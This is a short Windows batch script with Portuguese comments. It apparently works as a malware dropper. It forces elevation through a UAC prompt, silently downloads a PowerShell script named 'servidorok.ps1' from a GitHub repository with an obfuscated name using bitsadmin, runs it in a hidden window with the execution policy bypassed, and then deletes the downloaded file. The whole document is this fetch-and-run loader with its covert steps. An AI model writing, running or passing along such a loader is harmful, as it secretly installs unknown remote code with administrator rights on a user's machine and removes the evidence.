@echo off
:: Verifica se o script está sendo executado como administrador
NET SESSION >nul 2>&1
if %errorLevel% NEQ 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Variáveis para o download do script
set "scriptUrl=https://github.com/gerenciador2020/xzxsddswqe323ewe/raw/refs/heads/main/servidorok.ps1"
set "psFile=%temp%\script.ps1"

:: Baixa o script PowerShell de forma silenciosa usando bitsadmin
bitsadmin /transfer "DownloadScript" "%scriptUrl%" "%psFile%" >nul 2>&1

:: Executa o script PowerShell de forma oculta e com privilégios elevados
powershell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -File "%psFile%"

:: Limpa o script PowerShell baixado
del "%psFile%"

:: Sai do script
exit
